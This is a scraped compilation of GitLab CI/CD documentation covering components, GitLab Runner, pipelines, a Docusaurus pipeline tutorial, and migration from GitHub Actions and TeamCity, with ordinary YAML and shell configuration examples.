As anyone can publish components to the catalog, you should carefully review components before using them in your project. Use of GitLab CI/CD components is at your own risk and GitLab cannot guarantee the security of third-party components.

When using third-party CI/CD components, consider the following security best practices:

To maintain secure and trustworthy CI/CD components and ensure the integrity of the pipeline configuration you deliver to users, follow these best practices:

You might receive an error message similar to the following when using the ~latest or a partial semantic version qualifier to reference a component hosted by a catalog project:

The ~latest behavior was updated in GitLab 16.10. It now refers to the latest semantic version of the catalog resource. To resolve this issue, create a new release.

If a component has invalid formatting, you might not be able to create a release and could receive an error like Build component error: Spec must be a valid json schema.

This error can be caused by an empty spec:inputs section. If your configuration does not use any inputs, you can make the spec section empty instead. For example:

**Examples:**

Example 1 (unknown):
```unknown
spec:
  inputs:
    stage:
      default: test
---
component-job:
  script: echo job 1
  stage: $[[ inputs.stage ]]
```

Example 2 (unknown):
```unknown
├── templates/
│   └── my-component.yml
├── LICENSE.md
├── README.md
└── .gitlab-ci.yml
```

Example 3 (unknown):
```unknown
├── templates/
│   ├── my-component.yml
│   └── my-other-component/
│       ├── template.yml
│       ├── Dockerfile
│       └── test.sh
├── LICENSE.md
├── README.md
└── .gitlab-ci.yml
```

Example 4 (unknown):
```unknown
include:
  - component: $CI_SERVER_FQDN/my-org/security-components/secret-detection@1.0.0
    inputs:
      stage: build
```

---

## GitLab Runner

**URL:** https://docs.gitlab.com/runner/

**Contents:**
- GitLab Runner
- What GitLab Runner does
- Runner execution flow
- Runner deployment options
  - GitLab-hosted runners
  - Self-managed runners
- GitLab Runner versions
- Troubleshooting
- Glossary
- Contributing

GitLab Runner is an application that works with GitLab CI/CD to run jobs in a pipeline.

When developers push code to GitLab, they can define automated tasks in a .gitlab-ci.yml file. These tasks might include running tests, building applications, or deploying code. GitLab Runner is the application that executes these tasks on computing infrastructure.

As an administrator, you are responsible for providing and managing the infrastructure where these CI/CD jobs run. This involves installing GitLab Runner applications, configuring them, and ensuring they have adequate capacity to handle your organization’s CI/CD workload.

GitLab Runner connects to your GitLab instance and waits for CI/CD jobs. When a pipeline runs, GitLab sends jobs to available runners. The runner executes the job and reports the results back to GitLab.

GitLab Runner has the following features.

This diagram shows how runners are registered and how jobs are requested and handled. It also shows which actions use registration and authentication tokens, and job tokens.

GitLab-hosted runners are managed by GitLab and available on GitLab.com. You don’t need to install or maintain these runners - GitLab provides them as a service. However, you have limited control over the execution environment and cannot customize the infrastructure.

Self-managed runners are GitLab Runner instances that you install, configure, and manage in your own infrastructure. You can install and register self-managed runners on all GitLab installations. As an administrator, you typically work with self-managed runners.

Unlike GitLab-hosted runners, which are hosted and managed by GitLab, you have complete control over self-managed runners.

For compatibility reasons, the GitLab Runner major.minor version should stay in sync with the GitLab major and minor version. Older runners may still work with newer GitLab versions, and vice versa. However, features may not be available or work properly if a version difference exists.

Backward compatibility is guaranteed between minor version updates. However, sometimes minor version updates of GitLab can introduce new features that require GitLab Runner to be on the same minor version.

If you host your own runners but host your repositories on GitLab.com, keep GitLab Runner updated to the latest version, as GitLab.com is updated continuously.

Learn how to troubleshoot common issues.

For more information, see the official GitLab Word List and the GitLab Architecture entry for GitLab Runner.

Contributions are welcome. See CONTRIBUTING.md and the development documentation for details.

If you’re a reviewer of GitLab Runner project, take a moment to read the Reviewing GitLab Runner document.

You can also review the release process for the GitLab Runner project.

See the CHANGELOG to view recent changes.

This code is distributed under the MIT license. View the LICENSE file.

**Examples:**

Example 1 (unknown):
```unknown
sequenceDiagram
    participant GitLab
    participant GitLabRunner
    participant Executor

    opt registration
      GitLabRunner ->>+ GitLab: POST /api/v4/runners with registration_token
      GitLab -->>- GitLabRunner: Registered with runner_token
    end

    loop job requesting and handling
      GitLabRunner ->>+ GitLab: POST /api/v4/jobs/request with runner_token
      GitLab -->>+ GitLabRunner: job payload with job_token
      GitLabRunner ->>+ Executor: Job payload
      Executor ->>+ GitLab: clone sources with job_token
      Executor ->>+ GitLab: download artifacts with job_token
      Executor -->>- GitLabRunner: return job output and status
      GitLabRunner -->>- GitLab: updating job output and status with job_token
    end
```

---

## CI/CD pipelines

**URL:** https://docs.gitlab.com/ci/pipelines/

**Contents:**
- CI/CD pipelines
- Types of pipelines
- Configure a pipeline
  - Run a pipeline manually
    - View manual pipeline variables
    - Prefill variables in manual pipelines
    - Configure a list of selectable prefilled variable values
  - Run a pipeline by using a URL query string
  - Add manual interaction to your pipeline
    - Start all manual jobs in a stage

CI/CD pipelines are the fundamental component of GitLab CI/CD. Pipelines are configured in a .gitlab-ci.yml file by using YAML keywords.

Pipelines can run automatically for specific events, like when pushing to a branch, creating a merge request, or on a schedule. When needed, you can also run pipelines manually.

Pipelines are composed of:

A small pipeline could consist of three stages, executed in the following order:

To get started with your first pipeline, see Create and run your first GitLab CI/CD pipeline.

Pipelines can be configured in many different ways:

Pipelines and their component jobs and stages are defined with YAML keywords in the CI/CD pipeline configuration file for each project. When editing CI/CD configuration in GitLab, you should use the pipeline editor.

You can also configure specific aspects of your pipelines through the GitLab UI:

If you use VS Code to edit your GitLab CI/CD configuration, the GitLab Workflow extension for VS Code helps you validate your configuration and view your pipeline status.

Pipelines can be manually executed, with predefined or manually-specified variables.

You might do this if the results of a pipeline (for example, a code build) are required outside the standard operation of the pipeline.

To execute a pipeline manually:

The pipeline now executes the jobs as configured.

You can see all variables that are specified when the pipeline runs manually.

The required role depends on what you want to do:

When you turn on this setting, users with the Developer role can view variable values that might contain sensitive information from any manual pipeline run. For sensitive data like credentials or tokens, use protected variables or external secrets management instead of manual pipeline variables.

To view manual pipeline variables:

Variable values are masked by default. If you have at least the Developer role, you can select the eye icon to reveal values.

You can use the description and value keywords to define pipeline-level (global) variables that are prefilled when running a pipeline manually. Use the description to explain information such as what the variable is used for, and what the acceptable values are. You can use Markdown in the description.

Job-level variables cannot be pre-filled.

In manually-triggered pipelines, the New pipeline page displays all pipeline-level variables that have a description defined in the .gitlab-ci.yml file. The description displays below the variable.

You can change the prefilled value, which overrides the value for that single pipeline run. Any variables overridden by using this process are expanded and not masked. If you do not define a value for the variable in the configuration file, the variable name is still listed, but the value field is blank.

Because of a known issue, projects that use compliance pipelines can have prefilled variables not appear when running a pipeline manually. To workaround this issue, change the compliance pipeline configuration.

You can define an array of CI/CD variable values the user can select from when running a pipeline manually. These values are in a dropdown list in the New pipeline page. Add the list of value options to options and set the default value with value. The string in value must also be included in the options list.

You can use a query string to pre-populate the New pipeline page. For example, the query string .../pipelines/new?ref=my_branch&var[foo]=bar&file_var[file_foo]=file_bar pre-populates the New pipeline page with:

The format of the pipelines/new URL is:

The following parameters are supported:

For each var or file_var, a key and value are required.

Manual jobs, allow you to require manual interaction before moving forward in the pipeline.

You can do this straight from the pipeline graph. Select Run ( play ) to execute that particular job.

For example, your pipeline can start automatically, but require a manual action to deploy to production. In the following example, the production stage has a job with a manual action:

If a stage contains only manual jobs, you can start all the jobs at the same time by selecting Run all manual ( play ) above the stage. If the stage contains non-manual jobs, the option is not displayed.

To push a commit without triggering a pipeline, add [ci skip] or [skip ci], using any capitalization, to your commit message.

Alternatively, with Git 2.10 or later, use the ci.skip Git push option. The ci.skip push option does not skip merge request pipelines.

Users with the Owner role for a project can delete a pipeline:

Deleting a pipeline does not automatically delete its child pipelines. See issue 39503 for more details.

Deleting a pipeline expires all pipeline caches, and deletes all immediately related objects, such as jobs, logs, artifacts, and triggers. This action cannot be undone.

A strict security model is enforced when pipelines are executed on protected branches.

The following actions are allowed on protected branches if the user is allowed to merge or push to that specific branch:

Variables marked as protected are accessible to jobs that run in pipelines for protected branches. Only assign users the right to merge to protected branches if they have permission to access sensitive information like deployment credentials and tokens.

Runners marked as protected can run jobs only on protected branches, preventing untrusted code from executing on the protected runner and preserving deployment keys and other credentials from being unintentionally accessed. To ensure that jobs intended to be executed on protected runners do not use regular runners, they must be tagged accordingly.

Review how access to protected variables and runners work in the context of Merge request pipelines.

Review the deployment safety page for additional security recommendations for securing your pipelines.

This feature was deprecated in GitLab 17.6 and is planned for removal in 19.0. Use CI/CD jobs with pipeline trigger tokens instead. This is a breaking change.

You can set up your project to automatically trigger a pipeline based on tags in a different project. When a new tag pipeline in the subscribed project finishes, it triggers a pipeline on your project’s default branch, regardless of the tag pipeline’s success, failure, or cancellation.

To trigger the pipeline when the upstream project is rebuilt:

The maximum number of upstream pipeline subscriptions is 2 by default, for both the upstream and downstream projects. On GitLab Self-Managed, an administrator can change this limit.

The total running time for a given pipeline excludes:

That means that if a job is retried or manually re-run, only the duration of the latest run is included in the total running time.

Each job is represented as a Period, which consists of:

Visually, it can be viewed as:

Because A is retried, we ignore it and count only job A’. The union of B, A’, and C is (1, 4) and (6, 7). Therefore, the total running time is:

To view all the pipelines that ran for your project:

You can filter the Pipelines page by:

Select Pipeline ID in the dropdown list in the upper right to display the pipeline IDs (unique ID across the instance). Select pipeline IID to display the pipeline IIDs (internal ID, unique across the project only).

To view the pipelines that relate to a specific merge request, go to the Pipelines tab in the merge request.

Select a pipeline to open the pipeline details page which shows every job in the pipeline. From this page you can cancel a running pipeline, retry failed jobs, or delete a pipeline.

The pipeline details page displays a graph of all the jobs in the pipeline:

You can use a standard URL to access the details for specific pipelines:

When you configure jobs with the needs keyword, you have two options for how to group the jobs in the pipeline details page. To group the jobs by stage configuration, select stage in the Group jobs by section:

To group the jobs by needs configuration, select Job dependencies. You can optionally select Show dependencies to render lines between dependent jobs.

Jobs in the leftmost column run first, and jobs that depend on them are grouped in the next columns. In this example:

When you hover over a job in the Job dependencies view, every job that must run before the selected job is highlighted:

Pipeline mini graphs take less space and can tell you at a quick glance if all jobs passed or something failed. They show all related jobs for a single commit and the net result of each stage of your pipeline. You can quickly see what failed and fix it.

The pipeline mini graph always group jobs by stage, and display throughout GitLab when displaying pipeline or commit details.

Stages in pipeline mini graphs are expandable. Hover your mouse over each stage to see the name and status, and select a stage to expand its jobs list.

When a pipeline contains a job that triggers a downstream pipeline, you can see the downstream pipeline in the pipeline details view and mini graphs.

In the pipeline details view, a card displays for every triggered downstream pipeline on the right of the pipeline graph. Hover over a card to see which job triggered the downstream pipeline. Select a card to display the downstream pipeline to the right of the pipeline graph.

In the pipeline mini graph, the status of every triggered downstream pipeline displays as additional status icons to the right of the mini graph. Select a downstream pipeline status icon to go to the detail page of that downstream pipeline.

Pipeline analytics are available on the CI/CD Analytics page.

Pipeline status and test coverage report badges are available and configurable for each project. For information on adding pipeline badges to projects, see Pipeline badges.

GitLab provides API endpoints to:

When a runner picks a pipeline job, GitLab provides that job’s metadata. This includes the Git refspecs, which indicate which ref (such as branch or tag) and commit (SHA1) are checked out from your project repository.

This table lists the refspecs injected for each pipeline type:

The refs refs/heads/<name> and refs/tags/<name> exist in your project repository. GitLab generates the special ref refs/pipelines/<id> during a running pipeline job. This ref can be created even after the associated branch or tag has been deleted. It’s therefore useful in some features such as automatically stopping an environment, and merge trains that might run pipelines after branch deletion.

When a user deletes their GitLab.com account, the deletion does not occur for seven days. During this period, any pipeline subscriptions created by that user continue to run with the user’s original permissions. To prevent unauthorized pipeline executions, immediately update pipeline subscription settings for the deleted user.

If the predefined variables for a pipeline are defined in a separate file, they might not display in the New Pipeline page. You must have permission to access the separate file, or else the predefined variables cannot be displayed.

**Examples:**

Example 1 (unknown):
```unknown
variables:
  DEPLOY_CREDENTIALS:
    description: "The deployment credentials."
  DEPLOY_ENVIRONMENT:
    description: "Select the deployment target. Valid options are: 'canary', 'staging', 'production', or a stable branch of your choice."
    value: "canary"
```

Example 2 (unknown):
```unknown
variables:
  DEPLOY_ENVIRONMENT:
    value: "staging"
    options:
      - "production"
      - "staging"
      - "canary"
    description: "The deployment target. Set to 'staging' by default."
```

Example 3 (unknown):
```unknown
.../pipelines/new?ref=<branch>&var[<variable_key>]=<value>&file_var[<file_key>]=<value>
```

Example 4 (unknown):
```unknown
0  1  2  3  4  5  6  7
AAAAAAA
   BBBBBBB
      A'A'A'A
                  CCCC
```

---

## Migrate from GitHub Actions

**URL:** https://docs.gitlab.com/ci/migration/github_actions/

**Contents:**
- Migrate from GitHub Actions
- Key Similarities and Differences
- Comparison of features and concepts
  - Configuration file
  - GitHub Actions workflow syntax
  - Common configurations
    - Jobs
      - Parallel
      - Matrix
    - Trigger

If you’re migrating from GitHub Actions to GitLab CI/CD, you are able to create CI/CD pipelines that replicate and enhance your GitHub Action workflows.

GitHub Actions and GitLab CI/CD are both used to generate pipelines to automate building, testing, and deploying your code. Both share similarities including:

Additionally, there are some important differences between the two:

Many GitHub features and concepts have equivalents in GitLab that offer the same functionality.

GitHub Actions can be configured with a workflow YAML file. GitLab CI/CD uses a .gitlab-ci.yml YAML file by default.

For example, in a GitHub Actions workflow file:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

A GitHub Actions configuration is defined in a workflow YAML file using specific keywords. GitLab CI/CD has similar functionality, also usually configured with YAML keywords.

This section goes over commonly used CI/CD configurations, showing how they can be converted from GitHub Actions to GitLab CI/CD.

GitHub Action workflows generate automated CI/CD jobs that are triggered when certain event take place, for example pushing a new commit. A GitHub Action workflow is a YAML file defined in the .github/workflows directory located in the root of the repository. The GitLab equivalent is the .gitlab-ci.yml configuration file, which also resides in the repository’s root directory.

Jobs are a set of commands that run in a set sequence to achieve a particular result, for example building a container or deploying to production.

For example, this GitHub Actions workflow builds a container then deploys it to production. The jobs runs sequentially, because the deploy job depends on the build job:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

In both GitHub and GitLab, Jobs run in parallel by default.

For example, in a GitHub Actions workflow file:

This example runs a Python job and a Java job in parallel, using different container images. The Java job only runs when the staging branch is changed.

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

In this case, no extra configuration is needed to make the jobs run in parallel. Jobs run in parallel by default, each on a different runner assuming there are enough runners for all the jobs. The Java job is set to only run when the staging branch is changed.

In both GitLab and GitHub you can use a matrix to run a job multiple times in parallel in a single pipeline, but with different variable values for each instance of the job.

For example, in a GitHub Actions workflow file:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

GitHub Actions requires you to add a trigger for your workflow. GitLab is integrated tightly with Git, so SCM polling options for triggers are not needed, but can be configured per job if required.

Sample GitHub Actions configuration:

The equivalent GitLab CI/CD configuration would be:

Pipelines can also be scheduled by using Cron syntax.

With GitLab you can run your CI/CD jobs in separate, isolated Docker containers by using the image keyword.

For example, in a GitHub Actions workflow file:

In this example the apk update command runs in an alpine:latest container.

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

GitLab provides every project a container registry for hosting container images. Container images can be built and stored directly from GitLab CI/CD pipelines.

In GitLab, we use the variables keyword to define different CI/CD variables at runtime. Use variables when you need to reuse configuration data in a pipeline. You can define variables globally or per job.

For example, in a GitHub Actions workflow file:

In this example, variables provide different outputs for the jobs.

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

Variables can also be set up through the GitLab UI, under CI/CD settings, where you can protect or mask the variables. Masked variables are hidden in job logs, while protected variables can only be accessed in pipelines for protected branches or tags.

For example, in a GitHub Actions workflow file:

If the AWS_ACCESS_KEY variable is defined in the GitLab project settings, the equivalent GitLab CI/CD .gitlab-ci.yml file would be:

Additionally, GitHub Actions and GitLab CI/CD provide built-in variables which contain data relevant to the pipeline and repository.

When a new pipeline starts, GitLab checks the pipeline configuration to determine which jobs should run in that pipeline. You can use the rules keyword to configure jobs to run depending on conditions like the status of variables, or the pipeline type.

For example, in a GitHub Actions workflow file:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

Runners are the services that execute jobs. If you are using GitLab.com, you can use the instance runner fleet to run jobs without provisioning your own self-managed runners.

Some key details about runners:

For example, in a GitHub Actions workflow file:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

In GitLab, any job can use the artifacts keyword to define a set of artifacts to be stored when a job completes. Artifacts are files that can be used in later jobs.

For example, in a GitHub Actions workflow file:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

A cache is created when a job downloads one or more files and saves them for faster access in the future. Subsequent jobs that use the same cache don’t have to download the files again, so they execute more quickly. The cache is stored on the runner and uploaded to S3 if distributed cache is enabled.

For example, in a GitHub Actions workflow file:

The equivalent GitLab CI/CD .gitlab-ci.yml file would be:

In GitHub an Action is a set of complex tasks that need to be frequently repeated and is saved to enable reuse without redefining a CI/CD pipeline. In GitLab the equivalent to an action would be a the include keyword, which allows you to add CI/CD pipelines from other files, including template files built into GitLab.

Sample GitHub Actions configuration:

The equivalent GitLab CI/CD configuration would be:

In these examples, the setup-terraform GitHub action and the Terraform.gitlab-ci.yml GitLab template are not exact matches. These two examples are just to show how complex configuration can be reused.

GitLab provides a variety of security scanners out-of-the-box to detect vulnerabilities in all parts of the SLDC. You can add these features to your GitLab CI/CD pipeline by using templates.

for example to add SAST scanning to your pipeline, add the following to your .gitlab-ci.yml:

You can customize the behavior of security scanners by using CI/CD variables, for example with the SAST scanners.

Privileged information, often referred to as “secrets”, is sensitive information or credentials you need in your CI/CD workflow. You might use secrets to unlock protected resources or sensitive information in tools, applications, containers, and cloud-native environments.

For secrets management in GitLab, you can use one of the supported integrations for an external service. These services securely store secrets outside of your GitLab project, though you must have a subscription for the service.

GitLab also supports OIDC authentication for other third party services that support OIDC.

Additionally, you can make credentials available to jobs by storing them in CI/CD variables, though secrets stored in plain text are susceptible to accidental exposure. You should always store sensitive information in masked and protected variables, which mitigates some of the risk.

Also, never store secrets as variables in your .gitlab-ci.yml file, which is public to all users with access to the project. Storing sensitive information in variables should only be done in the project, group, or instance settings.

Review the security guidelines to improve the safety of your CI/CD variables.

The following list of recommended steps was created after observing organizations that were able to quickly complete this migration.

Before starting a migration you should create a migration plan to make preparations for the migration.

Before doing any migration work, you should first:

If you have questions that are not answered here, the GitLab community forum can be a great resource.

**Examples:**

Example 1 (unknown):
```unknown
on: [push]
jobs:
  hello:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Hello World"
```

Example 2 (unknown):
```unknown
stages:
  - hello

hello:
  stage: hello
  script:
    - echo "Hello World"
```

Example 3 (unknown):
```unknown
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    container: golang:alpine
    steps:
      - run: apk update
      - run: go build -o bin/hello
      - uses: actions/upload-artifact@v3
        with:
          name: hello
          path: bin/hello
          retention-days: 7
  deploy:
    if: contains( github.ref, 'staging')
    runs-on: ubuntu-latest
    container: golang:alpine
    steps:
      - uses: actions/download-artifact@v3
        with:
          name: hello
      - run: echo "Deploying to Staging"
      - run: scp bin/hello remoteuser@remotehost:/remote/directory
```

Example 4 (unknown):
```unknown
default:
  image: golang:alpine

stages:
  - build
  - deploy

build-job:
  stage: build
  script:
    - apk update
    - go build -o bin/hello
  artifacts:
    paths:
      - bin/hello
    expire_in: 1 week

deploy-job:
  stage: deploy
  script:
    - echo "Deploying to Staging"
    - scp bin/hello remoteuser@remotehost:/remote/directory
  rules:
    - if: $CI_COMMIT_BRANCH == 'staging'
```

---

## Get started with GitLab CI/CD

**URL:** https://docs.gitlab.com/ci/

**Contents:**
- Get started with GitLab CI/CD
- Step 1: Create a .gitlab-ci.yml file
- Step 2: Find or create runners
- Step 3: Define your pipelines
- Step 4: Use CI/CD variables and expressions as part of jobs
  - CI/CD variables
  - CI/CD expressions
- Step 5: Use CI/CD components

CI/CD is a continuous method of software development, where you continuously build, test, deploy, and monitor iterative code changes.

This iterative process helps reduce the chance that you develop new code based on buggy or failed previous versions. GitLab CI/CD can catch bugs early in the development cycle, and help ensure that the code deployed to production complies with your established code standards.

This process is part of a larger workflow:

To use GitLab CI/CD, you start with a .gitlab-ci.yml file at the root of your project. This file specifies the stages, jobs, and scripts to be executed during your CI/CD pipeline. It is a YAML file with its own custom syntax.

In this file, you define variables, dependencies between jobs, and specify when and how each job should be executed.

You can name this file anything you want, but .gitlab-ci.yml is the most common name, and the product documentation refers to it as the .gitlab-ci.yml file or the CI/CD configuration file.

For more information, see:

Runners are the agents that run your jobs. These agents can run on physical machines or virtual instances. In your .gitlab-ci.yml file, you can specify a container image you want to use when running the job. The runner loads the image, clones your project, and runs the job either locally or in the container.

If you use GitLab.com, runners on Linux, Windows, and macOS are already available for use. And you can register your own runners on GitLab.com if you’d like.

If you don’t use GitLab.com, you can:

For more information, see:

A pipeline is what you’re defining in the .gitlab-ci.yml file, and is what happens when the contents of the file are run on a runner.

Pipelines are made up of jobs and stages:

Pipelines can be triggered by various events, like commits or merges, or can be on schedule. In your pipeline, you can integrate with a wide range of tools and platforms.

For more information, see:

GitLab CI/CD variables are key-value pairs you use to store and pass configuration settings and sensitive information, like passwords or API keys, to jobs in a pipeline.

GitLab CI/CD expressions allow you to inject data dynamically into your pipeline configuration. The data available depends on the expression context. For example, the inputs context allows you to access information passed into the configuration file from a parent file or when a pipeline is run.

Use CI/CD variables to customize jobs by making values defined elsewhere accessible to jobs. You can hard-code CI/CD variables in your .gitlab-ci.yml file, set them in your project settings, or generate them dynamically. You can define them for the project, group, or instance.

Two types of variables exist: custom variables and predefined.

Variables can be marked as “protected” or “masked” for added security.

For more information, see:

CI/CD expressions use the $[[ ]] syntax and are evaluated when a pipeline is created. They are also evaluated during CI linting, so they can be tested in the Pipeline Editor.

Expressions enable dynamic configuration based on different contexts:

For more information, see:

A CI/CD component is a reusable pipeline configuration unit. Use a CI/CD component to compose an entire pipeline configuration or a small part of a larger pipeline.

You can add a component to your pipeline configuration with include:component.

Reusable components help reduce duplication, improve maintainability, and promote consistency across projects. Create a component project and publish it to the CI/CD Catalog to share your component across multiple projects.

GitLab also has CI/CD component templates for common tasks and integrations.

For more information, see:

---

## Tutorial: Create a complex pipeline

**URL:** https://docs.gitlab.com/ci/quick_start/tutorial/

**Contents:**
- Tutorial: Create a complex pipeline
- Prerequisites
- Create a project to hold the Docusaurus files
- Create the initial CI/CD configuration file
- Add a job to build the site
- Add a job to deploy the site
- Add test jobs
- Start using merge request pipelines
- Reduce duplicated configuration

This tutorial walks you through configuring a progressively more complex CI/CD pipeline through small, iterative steps. The pipeline is always fully functional, but it gains more functionality with each step. The goal is to build, test, and deploy a documentation site.

When you finish this tutorial, you will have a new project on GitLab.com and a working documentation site using Docusaurus.

To complete this tutorial, you will:

Before adding the pipeline configuration, you must first set up a Docusaurus project on GitLab.com:

Create a new project under your username (not a group):

On the project’s overview page, in the upper-right corner, select Code to find the clone paths for your project. Copy the SSH or HTTP path and use the path to clone the project locally.

For example, to clone with SSH into a pipeline-tutorial directory on your computer:

Change to the project’s directory, then generate a new Docusaurus site:

The Docusaurus initialization wizard prompts you with questions about the site. Use all the default options.

The initialization wizard sets up the site in website/, but the site should be in the root of the project. Move the files up to the root and delete the old directory:

Update the Docusaurus configuration file with the details of your GitLab project. In docusaurus.config.js:

Commit the changes, and push them to GitLab:

Start with the simplest possible pipeline configuration file to ensure CI/CD is enabled in the project and runners are available to run jobs.

This step introduces:

In this step, create a .gitlab-ci.yml file in the root of the project with this configuration:

Commit and push this change to GitLab, then:

Now that you have a .gitlab-ci.yml file in your project, you can make all future changes to pipeline configuration with the pipeline editor.

A common task for a CI/CD pipeline is to build the code in the project then deploy it. Start by adding a job that builds the site.

This step introduces:

In this step, replace test-job with build-job:

Use the pipeline editor to commit this pipeline configuration to the default branch, and check the job log. You can:

After verifying the Docusaurus site builds in build-job, you can add a job that deploys it.

This step introduces:

Use the pipeline editor to commit this pipeline configuration to the default branch, and view the pipeline details from the Pipelines list. Verify that:

If you need to use unique domains, in docusaurus.config.js, set baseUrl: to /.

Now that the site builds and deploys as expected, you can add tests and linting. For example, a Ruby project might run RSpec test jobs. Docusaurus is a static site that uses Markdown and generated HTML, so this tutorial adds jobs to test the Markdown and HTML.

This step introduces:

Commit this pipeline configuration to the default branch, and view the pipeline details.

With the previous pipeline configurations, the site deploys every time a pipeline completes successfully, but this is not an ideal development workflow. It’s better to work from feature branches and merge requests, and only deploy the site when changes merge to the default branch.

This step introduces:

Merge the changes in your merge request. This action updates the default branch. Verify that the new pipeline contains the pages job that deploys the site.

Be sure to use feature branches and merge requests for all future changes to pipeline configuration. Other project changes, like creating a Git tag or adding a pipeline schedule, do not trigger pipelines unless you add rules for those cases too.

The pipeline now contains three jobs that all have identical rules and image configuration. Instead of repeating these rules, use extends and default to create single sources of truth.

This step introduces:

Use a merge request to commit this pipeline configuration to the default branch. The file is simpler, but it should have the same behavior as the previous step.

You’ve just created a full pipeline and streamlined it to be more efficient. Nice work! Now you can take this knowledge, learn about the rest of the .gitlab-ci.yml keywords in the CI/CD YAML syntax reference, and build your own pipelines.

**Examples:**

Example 1 (unknown):
```unknown
git clone git@gitlab.com:my-username/my-pipeline-tutorial-project.git pipeline-tutorial
```

Example 2 (unknown):
```unknown
cd pipeline-tutorial
npm init docusaurus
```

Example 3 (unknown):
```unknown
mv website/* .
rm -r website
```

Example 4 (unknown):
```unknown
git add .
git commit -m "Add simple generated Docusaurus site"
git push origin
```

---

## Migrate from TeamCity

**URL:** https://docs.gitlab.com/ci/migration/teamcity/

**Contents:**
- Migrate from TeamCity
- Key similarities and differences
  - Configuration file
- Comparison of features and concepts
  - Jobs
  - Pipeline triggers
  - Variables
  - Artifacts
  - Runners
  - TeamCity build features & plugins

If you’re migrating from TeamCity to GitLab CI/CD, you can create CI/CD pipelines that replicate and enhance your TeamCity workflows.

GitLab CI/CD and TeamCity are CI/CD tools with some similarities. Both GitLab and TeamCity:

Additionally, there are some important differences between the two:

TeamCity can be configured from the UI or in the Teamcity Configuration file in the Kotlin DSL format. A TeamCity build configuration is a set of instructions that defines how a software project should be built, tested, and deployed. The configuration includes parameters and settings necessary for automating the CI/CD process in TeamCity.

In GitLab, the equivalent of a TeamCity build configuration is the .gitlab-ci.yml file. This file defines the CI/CD pipeline for a project, specifying the stages, jobs, and commands needed to build, test, and deploy the project.

Many TeamCity features and concepts have equivalents in GitLab that offer the same functionality.

TeamCity uses build configurations, which consist of multiple build steps where you define commands or scripts to execute tasks such as compiling code, running tests, and packaging artifacts.

The following is an example of a TeamCity project configuration in a Kotlin DSL format that builds a Docker file and runs unit tests:

In GitLab CI/CD, you define jobs with the tasks to execute as part of the pipeline. Each job can have one or more build steps defined in it.

The equivalent GitLab CI/CD .gitlab-ci.yml file for the previous example would be:

TeamCity Triggers define conditions that initiate a build, including VCS changes, scheduled triggers, or builds triggered by other builds.

In GitLab CI/CD, pipelines can be triggered automatically for various events, like changes to branches or merge requests and new tags. Pipelines can also be triggered manually, using an API, or with scheduled pipelines. For more information, see CI/CD pipelines.

In TeamCity, you define build parameters and environment variables in the build configuration settings.

In GitLab, use the variables keyword to define CI/CD variables. Use variables to reuse configuration data, have more dynamic configuration, or store important values. Variables can be defined either globally or per job.

For example, a GitLab CI/CD .gitlab-ci.yml file that uses variables:

Build configurations in TeamCity allow you to define artifacts generated during the build process.

In GitLab, any job can use the artifacts keyword to define a set of artifacts to be stored when a job completes. Artifacts are files that can be used in later jobs, for testing or deployment.

For example, a GitLab CI/CD .gitlab-ci.yml file that uses artifacts:

The equivalent of TeamCity agents in GitLab are Runners.

In GitLab CI/CD, runners are the services that execute jobs. If you are using GitLab.com, you can use the instance runner fleet to run jobs without provisioning your own self-managed runners.

Some key details about runners:

Some functionality in TeamCity that is enabled through build features & plugins is supported in GitLab CI/CD natively with CI/CD keywords and features.

The following list of recommended steps was created after observing organizations that were able to quickly complete a migration to GitLab CI/CD.

Before starting a migration you should create a migration plan to make preparations for the migration.

For a migration from TeamCity, ask yourself the following questions in preparation:

Before doing any migration work, you should first:

If you have questions that are not answered here, the GitLab community forum can be a great resource.

**Examples:**

Example 1 (unknown):
```unknown
package _Self.buildTypes

import jetbrains.buildServer.configs.kotlin.*
import jetbrains.buildServer.configs.kotlin.buildFeatures.perfmon
import jetbrains.buildServer.configs.kotlin.buildSteps.dockerCommand
import jetbrains.buildServer.configs.kotlin.buildSteps.nodeJS
import jetbrains.buildServer.configs.kotlin.triggers.vcs

object BuildTest : BuildType({
    name = "Build & Test"

    vcs {
        root(HttpsGitlabComRutshahCicdDemoGitRefsHeadsMain)
    }

    steps {
        dockerCommand {
            id = "DockerCommand"
            commandType = build {
                source = file {
                    path = "Dockerfile"
                }
            }
        }
        nodeJS {
            id = "nodejs_runner"
            workingDir = "app"
            shellScript = """
                npm install jest-teamcity --no-save
                npm run test -- --reporters=jest-teamcity
            """.trimIndent()
        }
    }

    triggers {
        vcs {
        }
    }

    features {
        perfmon {
        }
    }
})
```

Example 2 (unknown):
```unknown
workflow:
  rules:
    - if: $CI_COMMIT_BRANCH != "main" || $CI_PIPELINE_SOURCE != "merge_request_event"
      when: never
    - when: always

stages:
  - build
  - test

build-job:
  image: docker:20.10.16
  stage: build
  services:
    - docker:20.10.16-dind
  script:
    - docker build -t cicd-demo:0.1 .

run_unit_tests:
  image: node:17-alpine3.14
  stage: test
  before_script:
    - cd app
    - npm install
  script:
    - npm test
  artifacts:
    when: always
    reports:
      junit: app/junit.xml
```

Example 3 (unknown):
```unknown
default:
  image: alpine:latest

stages:
  - greet

variables:
  NAME: "Fern"

english:
  stage: greet
  variables:
    GREETING: "Hello"
  script:
    - echo "$GREETING $NAME"

spanish:
  stage: greet
  variables:
    GREETING: "Hola"
  script:
    - echo "$GREETING $NAME"
```

Example 4 (unknown):
```unknown
stage:
  - generate
  - use

generate_cat:
  stage: generate
  script:
    - touch cat.txt
    - echo "meow" > cat.txt
  artifacts:
    paths:
      - cat.txt
    expire_in: 1 week

use_cat:
  stage: use
  script:
    - cat cat.txt
```

---
